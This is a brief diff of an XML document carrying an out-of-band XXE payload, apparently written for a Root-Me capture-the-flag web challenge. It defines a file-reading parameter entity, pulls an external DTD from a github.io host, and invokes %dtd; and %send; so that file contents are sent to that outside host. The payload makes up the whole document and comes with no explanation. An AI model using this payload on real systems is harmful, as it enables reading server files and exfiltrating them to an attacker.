@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE rss [
-  <!ENTITY % file SYSTEM "file://challenge01.root-me.org/web-serveur/ch29/index.php">
+  <!ENTITY % file SYSTEM "checker">
   <!ENTITY % dtd SYSTEM "https://slavalaki.github.io/join.dtd">
   %dtd;
   %send;
